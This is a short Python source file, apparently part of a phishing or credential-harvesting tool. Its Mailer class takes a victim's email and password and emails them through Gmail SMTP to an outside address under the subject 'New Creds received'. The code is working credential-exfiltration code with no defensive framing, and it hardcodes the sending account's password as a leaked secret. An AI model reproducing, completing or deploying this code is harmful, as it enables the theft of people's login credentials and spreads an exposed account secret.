import smtplib
from email.message import EmailMessage

class Mailer():

    def send(self,mail,passwd):

        EMAIL = 'iamratatouilletherat@gmail.com'
        PASSWD = 'mPVW*b6vyUWfdf!*wf?2w5hL'
        msg = EmailMessage()
        msg['Subject'] = 'New Creds received'
        msg['From'] = EMAIL
        msg['To'] = "loganeye101@gmail.com"
        msg.set_content(f'[Email] : {mail}\n[PASSWD] : {passwd}')

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL, PASSWD)
            smtp.send_message(msg)